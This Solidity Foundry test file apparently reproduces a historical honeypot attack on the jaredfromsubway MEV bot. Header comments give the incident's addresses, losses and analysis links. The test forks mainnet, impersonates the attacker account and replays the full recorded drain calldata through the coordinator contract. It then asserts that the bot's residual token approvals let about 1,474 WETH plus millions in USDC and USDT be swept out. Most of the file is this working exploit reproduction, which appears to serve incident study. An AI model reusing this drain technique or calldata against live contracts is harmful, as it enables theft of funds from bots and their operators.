// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : CertiK ~4,424 ETH (~$7.5M) after stables→ETH; on-chain sweep:
//             1,474.582523004994977792 WETH + 2,870,573.127680 USDC + 2,035,760.155871 USDT
// Attacker caller EOA : 0x5aF38735B215b00aa7C9f93fEd7ee415CeCB36e1
// Profit recipient    : 0x3e37f4A10d771Ba9dE44b6d301410b1BEdeA65d0
// Coordinator         : 0xb84db016324e8F2BFdD8DD9c260338AEE0A8DF52
// Victim MEV bot      : 0x1f2F10D1C40777AE1Da742455c65828FF36Df387
// Operator label      : jaredfromsubway.eth → 0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13
// Attack Tx           : https://etherscan.io/tx/0x2be8704f5a59b69e0b71f64aefdb99eb0e8ae9fb3926147c581910d71bcf3e65
//
// @Info
// Classification: residual ERC-20 approvals left on untrusted bait wrappers after the
// bot's sandwich/arbitrage path. Wrappers did not fully consume allowance (large bait
// txs skipped transferFrom, minting fake path tokens instead). Later coordinator
// sweep loops 66 child contracts and drains real WETH/USDC/USDT via transferFrom.
//
// Honeypot bait layer (honest note): firms (Blockaid/Beosin) describe this as a
// counter-MEV honeypot, not a classical protocol bug. Still in-scope as bot-side
// approval-management SC flaw: approve-without-verify/revoke of residual allowance.
//
// @Analysis
// Beosin: https://beosin.com/resources/over-75-million-lost-analysis-of-a-honeypot-attack-on-mev-bot-and-stolen-funds-tracing
// CertiK: https://www.certik.com/blog/jaredfromsubway-mev-bot-incident-analysis
//
// PoC strategy: historical calldata replay of the coordinator drain at block-1.
// Exact multi-asset profit matches the live sweep tx.

address constant CALLER = 0x5aF38735B215b00aa7C9f93fEd7ee415CeCB36e1;
address constant PROFIT = 0x3e37f4A10d771Ba9dE44b6d301410b1BEdeA65d0;
address constant COORD = 0xb84db016324e8F2BFdD8DD9c260338AEE0A8DF52;
address constant VICTIM = 0x1f2F10D1C40777AE1Da742455c65828FF36Df387;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

// Sweep is in block 25360696; fork one before.
uint256 constant ATTACK_BLOCK = 25_360_696;
uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;

// Exact deltas on PROFIT from the historical sweep (pre vs post block)
uint256 constant EXPECTED_WETH = 1_474_582_523_004_994_977_792;
uint256 constant EXPECTED_USDC = 2_870_573_127_680; // 6 decimals
uint256 constant EXPECTED_USDT = 2_035_760_155_871; // 6 decimals

// Historical drain calldata (selector 0xc269a509) from attack tx
// 0x2be8704f5a59b69e0b71f64aefdb99eb0e8ae9fb3926147c581910d71bcf3e65
// ABI: (address[] children, address victimBot) — 66 bait wrappers + victim.
bytes constant DRAIN_CALLDATA =
        hex"c269a50900000000000000000000000000000000000000000000000000000000000000400000000000000000000000001f2f10d1c40777ae1da742455c65828f"
        hex"f36df387000000000000000000000000000000000000000000000000000000000000004200000000000000000000000068ca6a0c6db92bf2d4424c7c9fba8655"
        hex"992187c60000000000000000000000004ee0b6e9f9c4886beeef2ebd7fc27223169531ce000000000000000000000000757230bd24489b8d8817f4ff8e5a35eb"
        hex"eb3dde390000000000000000000000004db09fdce399f331775187bd81e9ecdfe179454a000000000000000000000000a61d15479e0aee1fca32fb0f4f986510"
        hex"2d13b7c800000000000000000000000033eaf8c1daca2be5f28d556c91d97bfb947fc02700000000000000000000000032ed8c7512a4766ac0aaab4a26a25519"
        hex"159d00a20000000000000000000000004556deb2280ca13e5e5109efc0ce5d89ca8ea1830000000000000000000000005b646681cf3d4ed2ed1d93d3627ab6f1"
        hex"374e22fc00000000000000000000000069216c47c5aab95f0f90db3ffa8d16970506ad0e0000000000000000000000000b52db096a26a1b8cfaab9d92184f289"
        hex"e3e5b0b300000000000000000000000066a1c994ed9828d31d60ac9967ac88859bcd227c000000000000000000000000265ea50a6ded45299c7d8cfa112c125e"
        hex"e14f87fd0000000000000000000000002e32c187513e8296917c4c2e6b88bda7f3ad3fd90000000000000000000000002f34f74c3eb35426bb53c0328a54570c"
        hex"fa478f8200000000000000000000000080ba9b35cf5db6c56af43d7925ce8098e32fead10000000000000000000000000839bc34c8be0902cc62c6a008a6c0dd"
        hex"3b4fb6d700000000000000000000000045c4ae5cc9c8a0334fc18c75add87a866eba3255000000000000000000000000052cb08c527c46a65647982d668d8084"
        hex"c980a784000000000000000000000000069eab79e3bbe25b4d9d6d3fbe9b1f911f4e90ca000000000000000000000000155596a9be8942afd0f9d368fbf8089c"
        hex"f02fada3000000000000000000000000f0008650c7ddc91fe58fbe3eed5479d27e381bc4000000000000000000000000320571e2ca822777c18d9405b23ae1a2"
        hex"7b08938f000000000000000000000000083dbf9ae41d5a3380eafc1537dfb323a7173c8c0000000000000000000000002c5d342533b6ff53818e2f7770158841"
        hex"abc2aa250000000000000000000000000691c927b0410e04a17a84269de09433911e6246000000000000000000000000a8aea3ddee3ef61edb60b9a57dd84119"
        hex"c5dd8df00000000000000000000000001a58279496342a1a4889aeb92294947520c444080000000000000000000000001b3021158ecb398964f94b4dcc0c1d29"
        hex"fd4f6412000000000000000000000000c1dde7d262eec33faf8ddbbf4770791800fe1ec9000000000000000000000000d7cd3037fb05d303552b3760f2d0ee0e"
        hex"ffc914170000000000000000000000002fa786bfd298ee24489435720cb5c306547b1cc40000000000000000000000000affcaef0528458de02bdd39f518903d"
        hex"fd9e2d0b000000000000000000000000b76fa816a8d85b7e3ae0c4f9372dd38510a5da1a0000000000000000000000006976f79ffc38579c0845969a867ae8af"
        hex"81e3d423000000000000000000000000997137541fd1e480c3405f86cd5e7bbc70e4159c00000000000000000000000006676dc6d856ab5c7aa1a836fb0f5106"
        hex"16ada2f100000000000000000000000019d29cd7161cccb5c4ad58286c91be9997d092190000000000000000000000008f250d565d2eac88b075255a463aa320"
        hex"34f054990000000000000000000000001c6e9a779bab8e9de13674ab9d604f6d61b3304b0000000000000000000000007bdfe0a661142f866ee5521fc5a1470e"
        hex"b04d746f0000000000000000000000009cde0dd4d922e9d0a36077555a89bffc8c14db99000000000000000000000000b77aefde8d6b9023edc0a1e3c7316475"
        hex"182d102900000000000000000000000074d3c4534178d72f16bd6663f69a7b8487f7882a0000000000000000000000000b841c47c5f30f4cc8d1d65b2488e3f3"
        hex"f2b4d1de00000000000000000000000091457d6ae5628b06562d6ae5b5aa9ab5b251932b000000000000000000000000bfede18b40a91118a4c3ddc7f0ca7b9e"
        hex"34efb2710000000000000000000000006105e0f02f360dc699f6d6da8d5055ed28312d2800000000000000000000000048558f259a6dfbe4a0826c27459b629d"
        hex"ec4bb2350000000000000000000000000767fef5047dcb47e56e47e543d0b428ea0dd8c90000000000000000000000003935fb260cc2118ca66817ffd57006eb"
        hex"cf6ccd2800000000000000000000000089d4d1a018ad6972135a729cde06f6dcb00aa4e700000000000000000000000050626a53007a0241d1f2924af0adba10"
        hex"1dd1be7400000000000000000000000013f189ecf7caa267c315917f148b787a4e241f59000000000000000000000000d2b7ba3720f35e5ef62ed737d9f41429"
        hex"8a15e6c90000000000000000000000003dff872c2a7271b5e651cdd1c3fdeeddabf1a67200000000000000000000000085fbdaf0919db5cdc66d5b862dab73c6"
        hex"8fdbf21100000000000000000000000047ba5118f6e9762c7e37897570ce672c6e6079ac000000000000000000000000c6b697d8352a0b0ce033e97518cef4a7"
        hex"9aa9e3a20000000000000000000000000d405c3387a888ffb67e7ffffc8d40b74b2a5e1d000000000000000000000000b0d027ea6b403965c9169e6bac7a7017"
        hex"eec0488300000000000000000000000068107a7357bdc673606a98ce6947cd12ca99ecf10000000000000000000000002da73640d6fc4dca145f71d688e4b5c3"
        hex"8c491388000000000000000000000000c814520767a1bc279299bd267459597a6e5e8e830000000000000000000000006c6fcbec1ad0a09fc22fae9c80a72789"
        hex"226911d2000000000000000000000000d04c31cbe66303186f06e1c2870902cddcc8ea70";

contract JaredFromSubway_exp is BaseTestWithBalanceLog {
    function setUp() public {
        // Online warm: exhaustive_warm rewrites localhost <-> mainnet alias.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        multiAssetLog = true;
        fundingTokens.push(WETH);
        fundingTokens.push(USDC);
        fundingTokens.push(USDT);
        attacker = PROFIT;
    }

    function testExploit() public balanceLog {
        vm.label(CALLER, "Attacker caller EOA");
        vm.label(PROFIT, "Profit recipient");
        vm.label(COORD, "Coordinator");
        vm.label(VICTIM, "Victim MEV bot");
        vm.label(WETH, "WETH");
        vm.label(USDC, "USDC");
        vm.label(USDT, "USDT");

        uint256 wethBefore = IERC20(WETH).balanceOf(PROFIT);
        uint256 usdcBefore = IERC20(USDC).balanceOf(PROFIT);
        uint256 usdtBefore = IERC20(USDT).balanceOf(PROFIT);
        uint256 victimWethBefore = IERC20(WETH).balanceOf(VICTIM);
        uint256 victimUsdcBefore = IERC20(USDC).balanceOf(VICTIM);
        uint256 victimUsdtBefore = IERC20(USDT).balanceOf(VICTIM);

        require(victimWethBefore >= EXPECTED_WETH, "victim WETH too low");
        require(victimUsdcBefore >= EXPECTED_USDC, "victim USDC too low");
        require(victimUsdtBefore >= EXPECTED_USDT, "victim USDT too low");

        // Historical tx sends 0.01 ETH with the drain call.
        vm.deal(CALLER, 0.01 ether);
        vm.startPrank(CALLER, CALLER);
        (bool ok, bytes memory ret) = COORD.call{value: 0.01 ether}(DRAIN_CALLDATA);
        require(ok, string(ret));
        vm.stopPrank();

        uint256 wethProfit = IERC20(WETH).balanceOf(PROFIT) - wethBefore;
        uint256 usdcProfit = IERC20(USDC).balanceOf(PROFIT) - usdcBefore;
        uint256 usdtProfit = IERC20(USDT).balanceOf(PROFIT) - usdtBefore;

        assertEq(wethProfit, EXPECTED_WETH, "WETH profit mismatch");
        assertEq(usdcProfit, EXPECTED_USDC, "USDC profit mismatch");
        assertEq(usdtProfit, EXPECTED_USDT, "USDT profit mismatch");
        assertEq(victimWethBefore - IERC20(WETH).balanceOf(VICTIM), EXPECTED_WETH, "victim WETH drain");
        assertEq(victimUsdcBefore - IERC20(USDC).balanceOf(VICTIM), EXPECTED_USDC, "victim USDC drain");
        assertEq(victimUsdtBefore - IERC20(USDT).balanceOf(VICTIM), EXPECTED_USDT, "victim USDT drain");

        emit log_named_decimal_uint("Attacker WETH profit", wethProfit, 18);
        emit log_named_decimal_uint("Attacker USDC profit", usdcProfit, 6);
        emit log_named_decimal_uint("Attacker USDT profit", usdtProfit, 6);
        emit log_named_uint("Bait child contracts in sweep", 66);
    }
}
